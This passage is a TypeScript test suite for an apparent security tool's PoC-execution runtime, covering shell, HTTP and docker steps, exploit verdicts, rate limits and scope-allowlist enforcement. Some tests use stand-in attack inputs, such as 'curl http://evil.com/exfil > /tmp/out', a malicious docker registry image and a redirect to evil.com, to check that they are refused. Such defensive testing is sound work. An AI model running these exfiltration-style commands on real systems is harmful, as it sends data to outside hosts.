/**
 * 0sec#171 — PoC execution runtime tests.
 *
 * Coverage:
 *   - shell action: exit-zero predicate happy path & failure
 *   - http action: http-status predicate happy path & failure
 *   - http action: persona header injection
 *   - http action: response body-contains predicate
 *   - http action: timeout via AbortController → kind: "errored"
 *   - shell action: timeout → kind: "errored"
 *   - note action: kind: "skipped"
 *   - docker action: dispatches to the spawn shim using `docker run …`
 *   - aggregate verdicts:
 *       all-pass → exploit_still_works
 *       a verify step failed → exploit_broken
 *       a setup step errored → could_not_run
 *
 * Tests never actually spawn processes or hit the network — both `spawn` and
 * `fetch` are routed through the runtime's dependency seam (`setRuntimeDeps`).
 */

import { describe, it, expect, beforeEach, afterEach } from "vitest";
import { EventEmitter } from "node:events";
import type { Finding, PocStep } from "@0sec/shared";
import {
  executePocSteps,
  setRuntimeDeps,
  MAX_CAPTURE_BYTES,
  _resetRateLimitState,
  _scopeMatch,
  type PocExecutionTarget,
} from "./poc-runtime.js";

// ── Test scaffolding ────────────────────────────────────────────────────────

interface FakeChildSpec {
  /** Bytes (or strings) the fake child should emit on stdout. */
  stdout?: string;
  /** Bytes the fake child should emit on stderr. */
  stderr?: string;
  /** Exit code the fake child should report; null means it never exits. */
  exitCode?: number | null;
  /** When true, never `close` (lets the runtime's timeout fire). */
  hang?: boolean;
  /** Throw synchronously from spawn(). */
  spawnError?: Error;
  /** Emit a child `error` event (e.g. ENOENT) instead of close. */
  childError?: Error;
}

interface FakeFetchCall {
  url: string;
  method?: string;
  headers?: Record<string, string>;
  body?: string;
  signal?: AbortSignal;
}

class FakeChild extends EventEmitter {
  stdout = new EventEmitter();
  stderr = new EventEmitter();
  killed = false;
  kill(_signal?: string) {
    this.killed = true;
    // Real child processes emit `close` after being killed; the fake
    // mirrors that so the runtime's promise resolves on timeout.
    setImmediate(() => this.emit("close", null));
    return true;
  }
}

function makeFakeSpawn(spec: FakeChildSpec): {
  spawnFn: any;
  calls: Array<{ cmd: string; args: string[]; opts: any }>;
} {
  const calls: Array<{ cmd: string; args: string[]; opts: any }> = [];
  const spawnFn = (cmd: string, args: string[], opts: any) => {
    calls.push({ cmd, args, opts });
    if (spec.spawnError) throw spec.spawnError;
    const child = new FakeChild();
    // Fire emissions on the next tick so the runtime gets a chance to wire
    // its `data`/`close` listeners first.
    setImmediate(() => {
      if (spec.stdout) child.stdout.emit("data", Buffer.from(spec.stdout, "utf8"));
      if (spec.stderr) child.stderr.emit("data", Buffer.from(spec.stderr, "utf8"));
      if (spec.childError) {
        child.emit("error", spec.childError);
        return;
      }
      if (!spec.hang) {
        child.emit("close", spec.exitCode ?? 0);
      }
    });
    return child as any;
  };
  return { spawnFn, calls };
}

function makeFakeFetch(
  responder: (req: FakeFetchCall) => Response | Promise<Response> | { delayMs?: number; resolveTo?: Response },
): { fetchFn: typeof fetch; calls: FakeFetchCall[] } {
  const calls: FakeFetchCall[] = [];
  const fetchFn = (async (url: any, init?: any) => {
    const call: FakeFetchCall = {
      url: typeof url === "string" ? url : String(url),
      method: init?.method,
      headers: init?.headers,
      body: typeof init?.body === "string" ? init.body : undefined,
      signal: init?.signal,
    };
    calls.push(call);
    const out = await responder(call);
    if (out instanceof Response) return out;
    // Timeout-style helper: never resolves, but listens to the abort signal.
    if (out && typeof out === "object" && "delayMs" in out) {
      return new Promise<Response>((resolve, reject) => {
        const timer = setTimeout(() => {
          resolve(out.resolveTo ?? new Response("late", { status: 200 }));
        }, out.delayMs ?? 60_000);
        if (init?.signal) {
          (init.signal as AbortSignal).addEventListener("abort", () => {
            clearTimeout(timer);
            const e = new Error("aborted");
            (e as any).name = "AbortError";
            reject(e);
          });
        }
      });
    }
    return new Response("", { status: 200 });
  }) as unknown as typeof fetch;
  return { fetchFn, calls };
}

function findingWith(steps: PocStep[]): Finding {
  return {
    id: "finding-test",
    templateId: "test",
    title: "Test finding",
    description: "Test",
    severity: "high",
    category: "ssrf",
    status: "verified",
    evidence: { request: "", response: "" },
    timestamp: 1,
    pocSteps: steps,
  };
}

// ── Restore deps after each test ────────────────────────────────────────────

let restore: (() => void) | undefined;
beforeEach(() => {
  restore = undefined;
  _resetRateLimitState();
});
afterEach(() => {
  if (restore) restore();
  restore = undefined;
  _resetRateLimitState();
});

// ── Shell action ────────────────────────────────────────────────────────────

describe("executePocSteps — shell action", () => {
  it("passes when exit-zero predicate holds", async () => {
    const { spawnFn, calls } = makeFakeSpawn({ stdout: "ok\n", exitCode: 0 });
    restore = setRuntimeDeps({ spawn: spawnFn });

    const finding = findingWith([
      {
        id: "shell-pass",
        kind: "exploit",
        summary: "Shell happy path",
        action: { type: "shell", cmd: "echo ok" },
        expect: { type: "exit-zero" },
      },
    ]);
    const report = await executePocSteps(finding, { scopeAllowlist: ["example.test"] });
    expect(report.steps).toHaveLength(1);
    expect(report.steps[0].kind).toBe("passed");
    expect(report.steps[0].observedExit).toBe(0);
    expect(report.steps[0].observedStdout).toBe("ok\n");
    // Was actually invoked through /bin/sh -c
    expect(calls[0].cmd).toBe("/bin/sh");
    expect(calls[0].args).toEqual(["-c", "echo ok"]);
    expect(report.overallVerdict).toBe("exploit_still_works");
  });

  it("fails cleanly when exit-zero predicate is violated", async () => {
    const { spawnFn } = makeFakeSpawn({ stderr: "boom\n", exitCode: 1 });
    restore = setRuntimeDeps({ spawn: spawnFn });

    const finding = findingWith([
      {
        id: "shell-fail",
        kind: "verify",
        summary: "Shell predicate fail",
        action: { type: "shell", cmd: "false" },
        expect: { type: "exit-zero" },
      },
    ]);
    const report = await executePocSteps(finding, { scopeAllowlist: ["example.test"] });
    expect(report.steps[0].kind).toBe("failed");
    expect(report.steps[0].observedExit).toBe(1);
    expect(report.steps[0].observedStderr).toBe("boom\n");
    expect(report.steps[0].error).toContain("expected exit-zero");
    expect(report.overallVerdict).toBe("exploit_broken");
  });

  it("merges target.env into the spawn environment", async () => {
    const { spawnFn, calls } = makeFakeSpawn({ exitCode: 0 });
    restore = setRuntimeDeps({ spawn: spawnFn });
    const finding = findingWith([
      {
        id: "env-step",
        kind: "exploit",
        summary: "uses env",
        action: { type: "shell", cmd: "echo $TOKEN" },
        expect: { type: "exit-zero" },
      },
    ]);
    await executePocSteps(finding, { env: { TOKEN: "deadbeef" }, scopeAllowlist: ["example.test"] });
    expect(calls[0].opts.env.TOKEN).toBe("deadbeef");
  });

  it("treats spawn ENOENT (child error) as errored", async () => {
    const { spawnFn } = makeFakeSpawn({ childError: new Error("ENOENT: no /bin/sh") });
    restore = setRuntimeDeps({ spawn: spawnFn });
    const finding = findingWith([
      {
        id: "missing-sh",
        kind: "exploit",
        summary: "no shell",
        action: { type: "shell", cmd: "anything" },
        expect: { type: "exit-zero" },
      },
    ]);
    const report = await executePocSteps(finding, { scopeAllowlist: ["example.test"] });
    expect(report.steps[0].kind).toBe("errored");
    expect(report.steps[0].error).toContain("ENOENT");
  });

  it("kills the child and returns errored on timeout", async () => {
    const { spawnFn } = makeFakeSpawn({ hang: true });
    restore = setRuntimeDeps({ spawn: spawnFn });
    const finding = findingWith([
      {
        id: "shell-timeout",
        kind: "exploit",
        summary: "hangs forever",
        action: { type: "shell", cmd: "sleep 600" },
        expect: { type: "exit-zero" },
      },
    ]);
    const report = await executePocSteps(finding, { timeoutMs: 25, scopeAllowlist: ["example.test"] });
    expect(report.steps[0].kind).toBe("errored");
    expect(report.steps[0].error).toMatch(/timeout/);
  });
});

// ── HTTP action ─────────────────────────────────────────────────────────────

describe("executePocSteps — http action", () => {
  it("passes when http-status predicate holds and captures the body", async () => {
    const { fetchFn, calls } = makeFakeFetch(() =>
      new Response("hello world", { status: 200 }),
    );
    restore = setRuntimeDeps({ fetch: fetchFn });

    const finding = findingWith([
      {
        id: "http-ok",
        kind: "exploit",
        summary: "GET /",
        action: { type: "http", method: "GET", url: "/healthz" },
        expect: { type: "http-status", status: 200 },
      },
    ]);
    const report = await executePocSteps(finding, { baseUrl: "http://localhost:3108", scopeAllowlist: ["localhost"] });
    expect(report.steps[0].kind).toBe("passed");
    expect(report.steps[0].observedStatus).toBe(200);
    expect(report.steps[0].observedResponseBody).toBe("hello world");
    expect(calls[0].url).toBe("http://localhost:3108/healthz");
    expect(calls[0].method).toBe("GET");
  });

  it("fails when the http-status predicate is violated", async () => {
    const { fetchFn } = makeFakeFetch(() => new Response("nope", { status: 403 }));
    restore = setRuntimeDeps({ fetch: fetchFn });
    const finding = findingWith([
      {
        id: "http-403",
        kind: "verify",
        summary: "/admin",
        action: { type: "http", method: "GET", url: "/admin" },
        expect: { type: "http-status", status: [200, 201] },
      },
    ]);
    const report = await executePocSteps(finding, { baseUrl: "http://localhost:3108", scopeAllowlist: ["localhost"] });
    expect(report.steps[0].kind).toBe("failed");
    expect(report.steps[0].observedStatus).toBe(403);
    expect(report.overallVerdict).toBe("exploit_broken");
  });

  it("evaluates body-contains against the response body", async () => {
    const { fetchFn } = makeFakeFetch(() =>
      new Response('{"role":"instance_admin"}', { status: 200 }),
    );
    restore = setRuntimeDeps({ fetch: fetchFn });
    const finding = findingWith([
      {
        id: "body-check",
        kind: "verify",
        summary: "leaked role",
        action: { type: "http", method: "GET", url: "/whoami" },
        expect: { type: "body-contains", text: "instance_admin" },
      },
    ]);
    const report = await executePocSteps(finding, { baseUrl: "http://localhost:3108", scopeAllowlist: ["localhost"] });
    expect(report.steps[0].kind).toBe("passed");
    expect(report.overallVerdict).toBe("exploit_still_works");
  });

  it("merges persona cookies/headers when X-0sec-Persona is set", async () => {
    const { fetchFn, calls } = makeFakeFetch(() => new Response("", { status: 200 }));
    restore = setRuntimeDeps({ fetch: fetchFn });
    const target: PocExecutionTarget = {
      baseUrl: "http://localhost:3108",
      scopeAllowlist: ["localhost"],
      personas: {
        attacker: {
          cookies: "session=abc123",
          headers: { Authorization: "Bearer attacker-token" },
        },
      },
    };
    const finding = findingWith([
      {
        id: "auth-as-attacker",
        kind: "exploit",
        summary: "act as attacker",
        action: {
          type: "http",
          method: "POST",
          url: "/api/whatever",
          headers: { "X-0sec-Persona": "attacker", "Content-Type": "application/json" },
          body: "{}",
        },
        expect: { type: "http-status", status: 200 },
      },
    ]);
    await executePocSteps(finding, target);
    const sent = calls[0].headers!;
    expect(sent.Authorization).toBe("Bearer attacker-token");
    expect(sent.Cookie).toBe("session=abc123");
    expect(sent["Content-Type"]).toBe("application/json");
    // Marker header must be stripped from the outgoing request.
    expect(sent["X-0sec-Persona"]).toBeUndefined();
  });

  it("times out via AbortController and reports errored", async () => {
    const { fetchFn } = makeFakeFetch(() => ({ delayMs: 10_000 }));
    restore = setRuntimeDeps({ fetch: fetchFn });
    const finding = findingWith([
      {
        id: "http-timeout",
        kind: "exploit",
        summary: "slow",
        action: { type: "http", method: "GET", url: "/slow" },
        expect: { type: "http-status", status: 200 },
      },
    ]);
    const report = await executePocSteps(finding, {
      baseUrl: "http://localhost:3108",
      scopeAllowlist: ["localhost"],
      timeoutMs: 25,
    });
    expect(report.steps[0].kind).toBe("errored");
    expect(report.steps[0].error).toMatch(/timeout/);
  });

  it("errors cleanly when a relative URL is passed without a baseUrl", async () => {
    const { fetchFn } = makeFakeFetch(() => new Response("", { status: 200 }));
    restore = setRuntimeDeps({ fetch: fetchFn });
    const finding = findingWith([
      {
        id: "no-base",
        kind: "exploit",
        summary: "needs base",
        action: { type: "http", method: "GET", url: "/relative" },
      },
    ]);
    const report = await executePocSteps(finding, { scopeAllowlist: ["example.test"] });
    expect(report.steps[0].kind).toBe("errored");
    expect(report.steps[0].error).toContain("baseUrl");
  });
});

// ── Note + docker actions ───────────────────────────────────────────────────

describe("executePocSteps — note action", () => {
  it("returns kind: skipped without doing any work", async () => {
    const finding = findingWith([
      {
        id: "explainer",
        kind: "prerequisite",
        summary: "operator-narrated",
        action: { type: "note", text: "Open the dashboard at /admin." },
      },
    ]);
    const report = await executePocSteps(finding, { scopeAllowlist: ["example.test"] });
    expect(report.steps[0].kind).toBe("skipped");
    expect(report.steps[0].durationMs).toBeGreaterThanOrEqual(0);
  });
});

describe("executePocSteps — docker action", () => {
  it("invokes spawn(\"docker\", [\"run\", ...args, image]) and respects exit predicate", async () => {
    const { spawnFn, calls } = makeFakeSpawn({ stdout: "container ok", exitCode: 0 });
    restore = setRuntimeDeps({ spawn: spawnFn });
    const finding = findingWith([
      {
        id: "docker-step",
        kind: "setup",
        summary: "side container",
        action: {
          type: "docker",
          image: "python:3.11-slim",
          args: ["-p", "9000:9000"],
        },
        expect: { type: "exit-zero" },
      },
    ]);
    const report = await executePocSteps(finding, { scopeAllowlist: ["example.test"] });
    expect(report.steps[0].kind).toBe("passed");
    expect(calls[0].cmd).toBe("docker");
    // run --rm comes first, then the user-provided args, then the image.
    expect(calls[0].args[0]).toBe("run");
    expect(calls[0].args).toContain("python:3.11-slim");
    // The image is the last positional argument so docker treats remaining
    // args as the run command — preserving operator intent.
    expect(calls[0].args[calls[0].args.length - 1]).toBe("python:3.11-slim");
  });
});

// ── Aggregate verdicts ──────────────────────────────────────────────────────

describe("executePocSteps — aggregate verdicts", () => {
  it("all verify steps passing → exploit_still_works", async () => {
    const { fetchFn } = makeFakeFetch(() => new Response("instance_admin", { status: 200 }));
    const { spawnFn } = makeFakeSpawn({ exitCode: 0, stdout: "" });
    restore = setRuntimeDeps({ fetch: fetchFn, spawn: spawnFn });

    const finding = findingWith([
      {
        id: "setup",
        kind: "setup",
        summary: "boot",
        action: { type: "shell", cmd: "echo booted" },
        expect: { type: "exit-zero" },
      },
      {
        id: "exploit",
        kind: "exploit",
        summary: "exfil",
        action: { type: "http", method: "POST", url: "/api/admin" },
        expect: { type: "http-status", status: 200 },
      },
      {
        id: "verify",
        kind: "verify",
        summary: "confirm role",
        action: { type: "http", method: "GET", url: "/whoami" },
        expect: { type: "body-contains", text: "instance_admin" },
      },
    ]);
    const report = await executePocSteps(finding, { baseUrl: "http://localhost:3108", scopeAllowlist: ["localhost"] });
    expect(report.steps.map((s) => s.kind)).toEqual(["passed", "passed", "passed"]);
    expect(report.overallVerdict).toBe("exploit_still_works");
  });

  it("a verify step cleanly failing → exploit_broken", async () => {
    let httpCall = 0;
    const { fetchFn } = makeFakeFetch(() => {
      httpCall++;
      // First call (the exploit POST) succeeds; the verify GET no longer
      // shows the elevated role — that's the canary having patched it.
      if (httpCall === 1) return new Response("ok", { status: 200 });
      return new Response("user", { status: 200 });
    });
    restore = setRuntimeDeps({ fetch: fetchFn });
    const finding = findingWith([
      {
        id: "exploit",
        kind: "exploit",
        summary: "post",
        action: { type: "http", method: "POST", url: "/api/admin" },
        expect: { type: "http-status", status: 200 },
      },
      {
        id: "verify",
        kind: "verify",
        summary: "confirm role",
        action: { type: "http", method: "GET", url: "/whoami" },
        expect: { type: "body-contains", text: "instance_admin" },
      },
    ]);
    const report = await executePocSteps(finding, { baseUrl: "http://localhost:3108", scopeAllowlist: ["localhost"] });
    expect(report.steps[0].kind).toBe("passed");
    expect(report.steps[1].kind).toBe("failed");
    expect(report.overallVerdict).toBe("exploit_broken");
  });

  it("a setup step erroring → could_not_run, downstream steps skipped", async () => {
    const { spawnFn } = makeFakeSpawn({
      childError: new Error("ENOENT: docker not on PATH"),
    });
    restore = setRuntimeDeps({ spawn: spawnFn });
    const finding = findingWith([
      {
        id: "setup",
        kind: "setup",
        summary: "boot container",
        action: { type: "docker", image: "vuln/app:latest", args: [] },
        expect: { type: "exit-zero" },
      },
      {
        id: "exploit",
        kind: "exploit",
        summary: "wouldn't get here",
        action: { type: "shell", cmd: "echo unreachable" },
        expect: { type: "exit-zero" },
      },
      {
        id: "verify",
        kind: "verify",
        summary: "wouldn't get here either",
        action: { type: "shell", cmd: "echo unreachable" },
        expect: { type: "exit-zero" },
      },
    ]);
    const report = await executePocSteps(finding, { scopeAllowlist: ["example.test"] });
    expect(report.steps).toHaveLength(3);
    expect(report.steps[0].kind).toBe("errored");
    expect(report.steps[1].kind).toBe("skipped");
    expect(report.steps[2].kind).toBe("skipped");
    expect(report.overallVerdict).toBe("could_not_run");
  });

  it("an empty step graph → could_not_run", async () => {
    const finding = findingWith([]);
    const report = await executePocSteps(finding, { scopeAllowlist: ["example.test"] });
    expect(report.steps).toEqual([]);
    expect(report.overallVerdict).toBe("could_not_run");
    expect(report.findingId).toBe("finding-test");
    // Timestamps should be ISO 8601 and in execution order.
    expect(typeof report.startedAt).toBe("string");
    expect(typeof report.endedAt).toBe("string");
  });
});

// ── Capture caps ────────────────────────────────────────────────────────────

describe("executePocSteps — output capture caps", () => {
  it("does not allocate more than ~1MiB even when stdout is enormous", async () => {
    const huge = "x".repeat(MAX_CAPTURE_BYTES + 1024);
    const { spawnFn } = makeFakeSpawn({ stdout: huge, exitCode: 0 });
    restore = setRuntimeDeps({ spawn: spawnFn });
    const finding = findingWith([
      {
        id: "huge",
        kind: "exploit",
        summary: "noisy",
        action: { type: "shell", cmd: "yes" },
        expect: { type: "exit-zero" },
      },
    ]);
    const report = await executePocSteps(finding, { scopeAllowlist: ["example.test"] });
    expect(report.steps[0].observedStdout!.length).toBeLessThanOrEqual(
      MAX_CAPTURE_BYTES + 64,
    );
    expect(report.steps[0].observedStdout).toContain("truncated at 1MiB");
  });
});

// ── Per-host RPS cap (Fix 6) ────────────────────────────────────────────────

describe("executePocSteps — per-host rate limit", () => {
  it("paces N+1 fast http requests so the elapsed time exceeds the bucket refill interval", async () => {
    // rps=2 → 1 token / 500 ms. With 2 burst tokens + a 3rd request we expect
    // at least ~500 ms total. Use a generous lower bound so this is stable
    // on slow CI (we only assert the bucket actually kicked in).
    const { fetchFn } = makeFakeFetch(() => new Response("", { status: 200 }));
    restore = setRuntimeDeps({ fetch: fetchFn });
    const finding = findingWith([
      { id: "s1", kind: "exploit", summary: "1", action: { type: "http", method: "GET", url: "/a" } },
      { id: "s2", kind: "exploit", summary: "2", action: { type: "http", method: "GET", url: "/b" } },
      { id: "s3", kind: "exploit", summary: "3", action: { type: "http", method: "GET", url: "/c" } },
    ]);
    const t0 = Date.now();
    await executePocSteps(finding, {
      baseUrl: "http://rate-limited.example.com",
      scopeAllowlist: ["rate-limited.example.com"],
      rpsPerHost: 2,
    });
    const elapsed = Date.now() - t0;
    // Bucket starts full (2 tokens) → first 2 requests pass instantly. The
    // 3rd needs a refill of ~500 ms.
    expect(elapsed).toBeGreaterThanOrEqual(400);
  });

  it("blocks subsequent requests for >=60s after a 429 with no Retry-After (cool-off)", async () => {
    // We mostly want to confirm the runtime sets the retryUntil window. We
    // can't actually wait 60s in a test, so we check the second request gets
    // parked past a short threshold (~250ms) — the bucket itself sleeps in
    // small increments while retryUntil is set.
    //
    // We pass an explicit small per-step timeoutMs so the http step's own
    // AbortController fires cleanly at the end of the test, instead of
    // leaving a multi-second fetch dangling. The afterEach
    // `_resetRateLimitState()` then zeroes the parked bucket's retryUntil
    // so the underlying 60-second cool-off sleep also exits.
    let calls = 0;
    const { fetchFn } = makeFakeFetch(() => {
      calls++;
      if (calls === 1) return new Response("limited", { status: 429 });
      return new Response("", { status: 200 });
    });
    restore = setRuntimeDeps({ fetch: fetchFn });
    const finding = findingWith([
      { id: "s1", kind: "exploit", summary: "1", action: { type: "http", method: "GET", url: "/a" } },
      { id: "s2", kind: "exploit", summary: "2", action: { type: "http", method: "GET", url: "/b" } },
    ]);
    // Race: the second http step should never resolve in 250ms because the
    // host is on a 60s cool-off. We assert only the first step completed
    // dispatch by checking the call counter after the wait window.
    const promise = executePocSteps(finding, {
      baseUrl: "http://cool-off.example.com",
      scopeAllowlist: ["cool-off.example.com"],
      rpsPerHost: 100, // big so refills aren't the gate
      timeoutMs: 250,
    });
    const timeout = new Promise<"timed-out">((r) => setTimeout(() => r("timed-out"), 250));
    const winner = await Promise.race([promise.then(() => "done" as const), timeout]);
    expect(winner).toBe("timed-out");
    // Step 1 fetched (429), step 2 still parked.
    expect(calls).toBe(1);
  });
});

// ── Scope allowlist (Fix 7) ─────────────────────────────────────────────────

describe("_scopeMatch", () => {
  it("exact host match", () => {
    expect(_scopeMatch("acme.com", ["acme.com"])).toBe(true);
    expect(_scopeMatch("evil.com", ["acme.com"])).toBe(false);
  });

  it("wildcard matches subdomains but NOT apex (H1 documented semantic)", () => {
    expect(_scopeMatch("a.acme.com", ["*.acme.com"])).toBe(true);
    expect(_scopeMatch("b.c.acme.com", ["*.acme.com"])).toBe(true);
    expect(_scopeMatch("acme.com", ["*.acme.com"])).toBe(false);
  });

  it("operator can list both apex and wildcard for full coverage", () => {
    const list = ["acme.com", "*.acme.com"];
    expect(_scopeMatch("acme.com", list)).toBe(true);
    expect(_scopeMatch("a.acme.com", list)).toBe(true);
  });

  it("ignores port in target host", () => {
    expect(_scopeMatch("acme.com:8080", ["acme.com"])).toBe(true);
  });

  it("empty / undefined allowlist == no gate (returns true)", () => {
    expect(_scopeMatch("anything", undefined)).toBe(true);
    expect(_scopeMatch("anything", [])).toBe(true);
  });

  it("case-insensitive", () => {
    expect(_scopeMatch("ACME.COM", ["acme.com"])).toBe(true);
    expect(_scopeMatch("a.ACME.com", ["*.acme.com"])).toBe(true);
  });

  // IPv6 literals: a naive `split(":")[0]` collapses every IPv6 host to its
  // first hextet (e.g. `[2001`), which would let one allowlisted IPv6 host
  // accidentally match every other out-of-scope IPv6 host. The normalizer
  // strips brackets and ignores ports, treating the whole literal as one
  // opaque key.
  it("matches bracketed IPv6 with port against allowlist entry", () => {
    expect(_scopeMatch("[2001:db8::1]:443", ["2001:db8::1"])).toBe(true);
    expect(_scopeMatch("[2001:db8::1]:443", ["[2001:db8::1]"])).toBe(true);
  });

  it("matches bracketed IPv6 without port", () => {
    expect(_scopeMatch("[2001:db8::1]", ["2001:db8::1"])).toBe(true);
  });

  it("strips port from plain IPv4 hosts in target and allowlist", () => {
    expect(_scopeMatch("10.0.0.1:8443", ["10.0.0.1"])).toBe(true);
    expect(_scopeMatch("10.0.0.1", ["10.0.0.1:8443"])).toBe(true);
  });

  it("does NOT collapse different IPv6 hosts to the same prefix", () => {
    // Bypass case: `[2001:db8::1]:443` and `[2001:dead::5]:8443` both
    // start with `[2001:` so the broken `.split(":")[0]` impl would treat
    // them as the same host. The fix must keep them distinct.
    expect(_scopeMatch("[2001:dead::5]:8443", ["2001:db8::1"])).toBe(false);
    expect(_scopeMatch("[2001:dead::5]:8443", ["[2001:db8::1]"])).toBe(false);
  });
});

describe("executePocSteps — scope allowlist enforcement", () => {
  it("refuses http step whose host is out-of-scope", async () => {
    const { fetchFn, calls } = makeFakeFetch(() => new Response("", { status: 200 }));
    restore = setRuntimeDeps({ fetch: fetchFn });
    const finding = findingWith([
      {
        id: "evil",
        kind: "exploit",
        summary: "evil",
        action: { type: "http", method: "GET", url: "http://evil.com/x" },
      },
    ]);
    const report = await executePocSteps(finding, {
      scopeAllowlist: ["acme.com", "*.acme.com"],
    });
    expect(report.steps[0].kind).toBe("errored");
    expect(report.steps[0].error).toContain("out-of-scope host");
    // Fetch must NOT have been dispatched.
    expect(calls).toHaveLength(0);
  });

  it("allows http step whose host matches allowlist", async () => {
    const { fetchFn } = makeFakeFetch(() => new Response("ok", { status: 200 }));
    restore = setRuntimeDeps({ fetch: fetchFn });
    const finding = findingWith([
      {
        id: "ok",
        kind: "exploit",
        summary: "ok",
        action: { type: "http", method: "GET", url: "http://api.acme.com/x" },
        expect: { type: "http-status", status: 200 },
      },
    ]);
    const report = await executePocSteps(finding, {
      scopeAllowlist: ["*.acme.com"],
    });
    expect(report.steps[0].kind).toBe("passed");
  });

  it("refuses shell step containing an out-of-scope URL token", async () => {
    const { spawnFn, calls } = makeFakeSpawn({ exitCode: 0 });
    restore = setRuntimeDeps({ spawn: spawnFn });
    const finding = findingWith([
      {
        id: "leak",
        kind: "exploit",
        summary: "curl evil",
        action: { type: "shell", cmd: "curl http://evil.com/exfil > /tmp/out" },
        expect: { type: "exit-zero" },
      },
    ]);
    const report = await executePocSteps(finding, {
      scopeAllowlist: ["acme.com", "*.acme.com"],
    });
    expect(report.steps[0].kind).toBe("errored");
    expect(report.steps[0].error).toContain("out-of-scope url in shell cmd");
    // Spawn must NOT have been called.
    expect(calls).toHaveLength(0);
  });

  it("refuses every executable action without a scope allowlist", async () => {
    const { spawnFn, calls: spawnCalls } = makeFakeSpawn({ exitCode: 0 });
    const { fetchFn, calls: fetchCalls } = makeFakeFetch(() => new Response("ok", { status: 200 }));
    restore = setRuntimeDeps({ spawn: spawnFn, fetch: fetchFn });

    for (const action of [
      { type: "shell" as const, cmd: "echo should-not-run" },
      { type: "docker" as const, image: "python:3.11-slim", args: [] },
      { type: "http" as const, method: "GET", url: "https://api.acme.com/check" },
    ]) {
      const report = await executePocSteps(
        findingWith([{ id: `missing-${action.type}`, kind: "verify", summary: "scope required", action }]),
        {},
      );
      expect(report.steps[0].kind).toBe("errored");
      expect(report.steps[0].error).toContain("requires a non-empty scope allowlist");
    }

    expect(spawnCalls).toHaveLength(0);
    expect(fetchCalls).toHaveLength(0);
  });

  it("refuses shell and docker steps when the caller requires HTTP-only reverify", async () => {
    const { spawnFn, calls } = makeFakeSpawn({ exitCode: 0 });
    restore = setRuntimeDeps({ spawn: spawnFn });

    for (const action of [
      { type: "shell" as const, cmd: "echo should-not-run" },
      { type: "docker" as const, image: "registry.acme.com/app:latest", args: [] },
    ]) {
      const report = await executePocSteps(
        findingWith([{ id: `disabled-${action.type}`, kind: "verify", summary: "process disabled", action }]),
        { allowProcessActions: false, scopeAllowlist: ["*.acme.com"] },
      );
      expect(report.steps[0].kind).toBe("errored");
      expect(report.steps[0].error).toContain("require an isolated execution environment");
    }

    expect(calls).toHaveLength(0);
  });

  it("allows shell step whose only URL token is in scope", async () => {
    const { spawnFn } = makeFakeSpawn({ exitCode: 0 });
    restore = setRuntimeDeps({ spawn: spawnFn });
    const finding = findingWith([
      {
        id: "ok",
        kind: "exploit",
        summary: "curl acme",
        action: { type: "shell", cmd: "curl https://api.acme.com/x" },
        expect: { type: "exit-zero" },
      },
    ]);
    const report = await executePocSteps(finding, {
      scopeAllowlist: ["*.acme.com"],
    });
    expect(report.steps[0].kind).toBe("passed");
  });

  // ── Docker allowlist (PK-PUBLIC-004) ───────────────────────────────────

  it("docker: absent allowlist refuses without dispatch", async () => {
    const { spawnFn, calls } = makeFakeSpawn({ exitCode: 0 });
    restore = setRuntimeDeps({ spawn: spawnFn });
    const finding = findingWith([
      {
        id: "docker-missing-scope",
        kind: "setup",
        summary: "scope required",
        action: { type: "docker", image: "python:3.11-slim", args: [] },
        expect: { type: "exit-zero" },
      },
    ]);
    const report = await executePocSteps(finding, {});
    expect(report.steps[0].kind).toBe("errored");
    expect(report.steps[0].error).toContain("requires a non-empty scope allowlist");
    expect(calls).toHaveLength(0);
  });

  it("docker: refuses action with an out-of-scope URL in image", async () => {
    const { spawnFn, calls } = makeFakeSpawn({ exitCode: 0 });
    restore = setRuntimeDeps({ spawn: spawnFn });
    const finding = findingWith([
      {
        id: "docker-evil",
        kind: "setup",
        summary: "evil registry",
        action: { type: "docker", image: "evil-registry.com/malicious:latest", args: [] },
        expect: { type: "exit-zero" },
      },
    ]);
    const report = await executePocSteps(finding, {
      scopeAllowlist: ["acme.com", "*.acme.com"],
    });
    expect(report.steps[0].kind).toBe("errored");
    expect(report.steps[0].error).toContain("out-of-scope docker registry");
    expect(calls).toHaveLength(0);
  });

  it("docker: refuses action with an out-of-scope URL in args", async () => {
    const { spawnFn, calls } = makeFakeSpawn({ exitCode: 0 });
    restore = setRuntimeDeps({ spawn: spawnFn });
    const finding = findingWith([
      {
        id: "docker-evil-args",
        kind: "setup",
        summary: "evil arg",
        action: { type: "docker", image: "python:3.11-slim", args: ["curl", "http://evil.com/x"] },
        expect: { type: "exit-zero" },
      },
    ]);
    const report = await executePocSteps(finding, {
      scopeAllowlist: ["acme.com", "*.acme.com"],
    });
    expect(report.steps[0].kind).toBe("errored");
    expect(report.steps[0].error).toContain("out-of-scope url in docker action");
    expect(calls).toHaveLength(0);
  });

  it("docker: allows action whose URL tokens are in scope", async () => {
    const { spawnFn, calls } = makeFakeSpawn({ exitCode: 0 });
    restore = setRuntimeDeps({ spawn: spawnFn });
    const finding = findingWith([
      {
        id: "docker-safe",
        kind: "setup",
        summary: "safe registry",
        action: { type: "docker", image: "registry.acme.com/app:latest", args: [] },
        expect: { type: "exit-zero" },
      },
    ]);
    const report = await executePocSteps(finding, {
      scopeAllowlist: ["*.acme.com"],
    });
    expect(report.steps[0].kind).toBe("passed");
    expect(calls).toHaveLength(1);
  });

  // ── HTTP redirect validation (PK-PUBLIC-005) ────────────────────────────

  it("redirect: absolute off-target URL is rejected", async () => {
    let callIndex = 0;
    const { fetchFn, calls } = makeFakeFetch(() => {
      callIndex++;
      if (callIndex === 1) {
        return new Response("", { status: 302, headers: { location: "http://evil.com/exfil" } });
      }
      return new Response("ok", { status: 200 });
    });
    restore = setRuntimeDeps({ fetch: fetchFn });

    const finding = findingWith([
      {
        id: "redirect-evil",
        kind: "exploit",
        summary: "redirect",
        action: { type: "http", method: "GET", url: "http://api.acme.com/redirect" },
      },
    ]);
    const report = await executePocSteps(finding, {
      scopeAllowlist: ["*.acme.com"],
      rpsPerHost: 100,
    });
    expect(report.steps[0].kind).toBe("errored");
    expect(report.steps[0].error).toContain("redirect to out-of-scope host");
    // Only the first fetch (the redirect response) should have been made.
    expect(calls).toHaveLength(1);
  });

  it("redirect: cross-scope redirect is rejected (in-scope → out-of-scope)", async () => {
    let callIndex = 0;
    const { fetchFn, calls } = makeFakeFetch(() => {
      callIndex++;
      if (callIndex === 1) {
        return new Response("", { status: 301, headers: { location: "http://other.acme.com/evil" } });
      }
      return new Response("ok", { status: 200 });
    });
    restore = setRuntimeDeps({ fetch: fetchFn });

    const finding = findingWith([
      {
        id: "cross-scope",
